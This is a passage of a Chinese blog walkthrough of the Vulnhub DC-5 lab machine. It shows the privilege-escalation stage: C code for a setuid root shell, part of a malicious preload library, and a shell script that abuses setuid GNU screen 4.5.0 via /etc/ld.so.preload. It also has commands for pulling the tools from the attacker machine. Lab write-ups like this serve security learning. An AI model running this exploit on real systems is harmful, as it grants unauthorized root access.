chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260203001120372.png" alt="image-20260203001120372" /></p>
+<h4 id="将第二部分的代码写入rootshellc并编译"><a class="markdownIt-Anchor" href="#将第二部分的代码写入rootshellc并编译"></a> 将第二部分的代码写入rootshell.c并编译</h4>
+<p>将第二部分的代码写入rootshell.c文件并执行命令生成rootshell文件<br />
+这里我直接采用vim创建文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim rootshell.c</span><br></pre></td></tr></table></figure>
+<p>写入如下内容：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pwd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;grp.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260203001220511.png" alt="image-20260203001220511" /></p>
+<p>编译：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260203001854930.png" alt="image-20260203001854930" /></p>
+<h4 id="将第三部分代码写入dc5sh文件"><a class="markdownIt-Anchor" href="#将第三部分代码写入dc5sh文件"></a> 将第三部分代码写入dc5.sh文件</h4>
+<p>将最后一部分代码写入dc5.sh文件中。需要注意的是，需要在文件开头写入#!/bin/bash表示执行环境。最后保存是需要输入:set ff=unix是为了防止脚本的格式错误。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br><span class="line">/tmp/rootshell </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:set ff=unix</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260203001924066.png" alt="image-20260203001924066" /></p>
+<p>完成3个步骤后之间把三个文件上传至靶机的/tmp文件下，然后执行./dc5即可提权。<br />
+将这三个文件传到靶机</p>
+<blockquote>
+<p>上传文件一般有两种：</p>
+<p>蚁剑直接上传</p>
+<p>Kali开启http服务,靶机wget</p>
+<p>这里补充一种：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">靶机shell中执行如下命令从攻击机取文件，需要注意的是，需要开放22端口</span></span><br><span class="line">scp -r root@192.168.233.130:/root/dc-5 /tmp/dc-5</span><br><span class="line">scp -r root@攻击机IP:文件所在绝对路径 目的地绝对路径</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="../images/image-20260203001936562.png" alt="image-20260203001936562" /></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x dc5.sh</span><br><span class="line">chmod 777 dc5.sh</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260203002030196.png" alt="image-20260203002030196" /></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/screen4-5-0%E6%8F%90%E6%9D%83/" rel="tag">screen4.5.0提权</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/126839103p0master1200.jpg" data-sizes="auto" alt="破阵巅峰2026" class="lazyload">
+          
+        
+        <a href="/2026/02/07/%E7%A0%B4%E9%98%B5%E5%B7%85%E5%B3%B02026/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            破阵巅峰2026
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/126839103p0master1200.jpg" data-sizes="auto" alt="SHCTF2026" class="lazyload">
+        
+      
+      <a href="/2026/02/02/SHCTF2026/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          SHCTF2026
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text"> 外网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text"> 主机发现+端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.2.</span> <span class="toc-text"> 目录爆破-&gt;文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%ABgetshell"><span class="toc-number">1.3.</span> <span class="toc-text"> 日志包含getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text"> 后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#screen-450%E6%8F%90%E6%9D%83"><span class="toc-number">2.1.</span> <span class="toc-text"> screen-4.5.0提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9%E5%86%99%E5%88%B0libhaxc%E5%B9%B6%E7%BC%96%E8%AF%91"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 将第一部分内容写到libhax.c并编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86%E7%9A%84%E4%BB%A3%E7%A0%81%E5%86%99%E5%85%A5rootshellc%E5%B9%B6%E7%BC%96%E8%AF%91"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 将第二部分的代码写入rootshell.c并编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86%E4%BB%A3%E7%A0%81%E5%86%99%E5%85%A5dc5sh%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.3.</span> <span class="toc-text"> 将第三部分代码写入dc5.sh文件</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "[Vulnhub靶机通关]DC-5",
+          url: "http://example.com/2026/02/02/[Vulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3]DC-5/",
+          excerpt: "",
+          description: "",
+          stripContent: "[TOC]  外网渗透  主机发现+端口扫描 1nmap -sn 192.168.139.1/24  详细信息扫描： 1nmap -sS -T5 -sC -p- --min-rate 10000 192.168.139.134     端口 状态 服务 版本/详情     80/tcp 开放 http Web服务器（标题为 “Welcome”）   111/tcp 开放 rpcbind RPC端口映射器 (版本 2,3,4)   39021/tcp 开放 status RPC status 服务",
+          date: "Mon Feb 02 2026 22:52:33 GMT+0800",
+          updated: "Tue Feb 03 2026 00:29:20 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
